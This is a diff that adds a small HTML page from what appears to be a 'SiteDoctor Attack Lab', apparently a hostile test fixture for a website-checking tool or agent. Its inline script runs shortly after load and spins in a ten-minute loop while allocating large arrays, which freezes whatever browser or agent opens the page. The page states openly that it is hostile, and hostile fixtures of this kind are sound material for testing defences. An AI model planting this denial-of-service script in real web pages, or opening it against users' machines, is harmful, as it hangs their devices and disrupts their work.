@@ -1,0 +1,17 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Attack 5 · Freeze the machine</title>
+
+<style>body{font:16px/1.6 system-ui,sans-serif;max-width:720px;margin:40px auto;padding:0 20px;color:#1d2430}h1{font-size:28px}.note{background:#fff4e5;border:1px solid #f3c27a;padding:12px 14px;border-radius:8px;font-size:14px}</style>
+</head>
+<body>
+<h1>Attack 5 · Freeze the machine</h1>
+<p class="note">SiteDoctor Attack Lab — this page is deliberately hostile. It attacks whatever opens it.</p>
+<p>After loading, the page starts an infinite loop and eats memory to freeze whoever opens it.</p>
+<script>
+setTimeout(()=>{const hog=[];const end=Date.now()+600000;while(Date.now()<end){hog.push(new Array(1e5).fill(Math.random()));if(hog.length>400)hog.length=0}},300);
+</script>
+</body>
+</html>
